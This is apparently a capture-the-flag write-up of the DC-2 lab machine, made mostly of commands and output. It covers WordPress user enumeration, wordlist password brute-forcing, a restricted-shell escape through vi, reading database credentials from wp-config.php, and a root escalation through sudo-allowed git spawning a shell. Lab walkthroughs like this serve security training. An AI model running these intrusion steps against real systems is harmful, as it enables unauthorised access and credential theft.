Easy Box from Proving Grounds
```
❯ rustscan --ulimit=5000 --range=1-65535 -a 192.168.168.194 -- -sV
port 80

❯ nmap -sS -vvv -Pn -p1000-9999 --min-rate 2000 $ip
Not shown: 8999 closed tcp ports (reset)
PORT     STATE SERVICE    REASON
7744/tcp open  raqmon-pdu syn-ack ttl 61

❯ nmap -sC -sV -Pn -p80,7744 $ip
Host is up (0.15s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Did not follow redirect to http://dc-2/
|_http-server-header: Apache/2.4.10 (Debian)
7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 52517b6e70a4337ad24be10b5a0f9ed7 (DSA)
|   2048 5911d8af38518f41a744b32803809942 (RSA)
|   256 df181d7426cec14f6f2fc12654315191 (ECDSA)
|_  256 d9385f997c0d647e1d46f6e97cc63717 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
```
❯ echo "192.168.168.194  dc-2" | tee -a /etc/hosts
192.168.168.194  dc-2

```
Wordpress 4.7.10 on it
found this shit
```
Flag 1:
Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.
More passwords is always better, but sometimes you just can’t win them all.
Log in as one to see the next flag.
If you can’t find it, log in as another.
```

so now first i will find users on this wordpress
```
❯ wpscan --url dc-2/ -e u
[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] jerry
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] tom
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

```

Now generate password using `cewl`
```
❯ cewl -d 2 -m 5 -w password.txt http://dc-2/ --with-numbers
```

Now crack
```
❯ wpscan --url dc-2/ -e u --passwords password.txt
[+] Performing password attack on Xmlrpc against 3 user/s
 Trying admin / pellentesque Time: 00:00:53 <======================          > (350 / 495) 70.70%  ETA: 00:00:2[SUCCESS] - jerry / adipiscing                                                                                 
[SUCCESS] - tom / parturient                                                                                   
Trying admin / sometimes Time: 00:01:09 <====================               > (466 / 796) 58.54%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: jerry, Password: adipiscing
 | Username: tom, Password: parturient
```

Logged in on jerry but not admin. will try tom. also not admin; i will try ssh
## Shell
```
❯  ssh tom@$ip -p 7744
tom@192.168.168.194's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
tom@DC-2:~$ 

```
ssh worked on tom user
I am on a rbash `restricted bash`
```
-rbash: PATH: readonly variable
tom@DC-2:~$ s
-rbash: s: command not found
tom@DC-2:~$ ls
flag3.txt  local.txt  usr
tom@DC-2:~$ ls -la
total 44
drwxr-x--- 3 tom  tom  4096 Dec  7 09:48 .
drwxr-xr-x 4 root root 4096 Mar 21  2019 ..
-rwxr-x--- 1 tom  tom    66 Mar 21  2019 .bash_history
-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .bash_login
-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .bash_logout
-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .bash_profile
-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .bashrc
-rwxr-x--- 1 tom  tom    95 Mar 21  2019 flag3.txt
-rw-r--r-- 1 root root   33 Dec  7 09:48 local.txt
-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .profile
drwxr-x--- 3 tom  tom  4096 Mar 21  2019 usr
tom@DC-2:~$ cat
-rbash: cat: command not found
tom@DC-2:~$ "i"d
-rbash: id: command not found
tom@DC-2:~$ 
```
https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/
https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf

Escape
```
vi
:set shell=/bin/sh

:shell
```
```
After escaping the restricted shell, we export “/bin/bash” as our SHELL environment variable and “/usr/bin” as our PATH environment variable so that we can run Linux commands properly.

export PATH=/bin:/usr/bin:$PATH
export SHELL=/bin/bash:$SHELL
$ id
uid=1001(tom) gid=1001(tom) groups=1001(tom)
$ whoami
tom
$ 
$ cat loca*
ed6bb65f3487edd96e427ea5232fcd5e
$ cat flag*
Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
$ 
$ ls
jerry  tom

```


## Escalate
```
$ cd jerry
$ ls
flag4.txt
$ cat flag*
Good to see that you've made it this far - but you're not home yet. 

You still need to get the final flag (the only flag that really counts!!!).  

No hints here - you're on your own now.  :-)

Go on - git outta here!!!!

$ 
```

Launched `linpeash` and he suggest
```
╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2
  [1] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [2] overlayfs
      CVE-2015-8660
      Source: http://www.exploit-db.com/exploits/39230
```
But not work
```
╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-r--r-- 1 root root 3233 Mar 21  2019 /var/www/html/wp-config.php
define('DB_NAME', 'wordpressdb');
define('DB_USER', 'wpadmin');
define('DB_PASSWORD', '4uTiLL');
define('DB_HOST', 'localhost');


```
```
$ ss -tupln
Netid State      Recv-Q Send-Q                                Local Address:Port                                  Peer Address:Port 
tcp   LISTEN     0      20                                        127.0.0.1:25                                               *:*     
tcp   LISTEN     0      128                                               *:7744                                             *:*     
tcp   LISTEN     0      50                                        127.0.0.1:3306                                             *:*     
tcp   LISTEN     0      20                                              ::1:25                                              :::*     
tcp   LISTEN     0      128                                              :::7744                                            :::*     
tcp   LISTEN     0      128                                              :::80                                              :::*     
$ 
```
I will try to login on this db.
Worked
Cracked password. but not work for root

Now Let's go back and try to connect on jerry user using her password
```
$ su jerry
Password: 
jerry@DC-2:/home/tom/usr/bin$ 
```
Shit it's work
```
jerry@DC-2:~$ sudo -l
Matching Defaults entries for jerry on DC-2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jerry may run the following commands on DC-2:
    (root) NOPASSWD: /usr/bin/git
jerry@DC-2:~$ 
```
Get root
```
    (root) NOPASSWD: /usr/bin/git
jerry@DC-2:~$ sudo git -p help config
!sh
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# 
# hostnamectl
   Static hostname: DC-2
         Icon name: computer-vm
           Chassis: vm
        Machine ID: eacb6780d84441be8d32c0df4d29cda6
           Boot ID: d5793d79caf147528a803dbf216b1650
    Virtualization: vmware
  Operating System: Debian GNU/Linux 8 (jessie)
            Kernel: Linux 3.16.0-4-586
      Architecture: x86
# 
# cat *
 __    __     _ _       _                    _ 
/ / /\ \ \___| | |   __| | ___  _ __   ___  / \
\ \/  \/ / _ \ | |  / _` |/ _ \| '_ \ / _ \/  /
 \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ 
  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   


Congratulatons!!!

A special thanks to all those who sent me tweets
and provided me with feedback - it's all greatly
appreciated.

If you enjoyed this CTF, send me a tweet via @DCAU7.

aa1d8dfc6c3a69be0c6a5726592f67d0
# 


```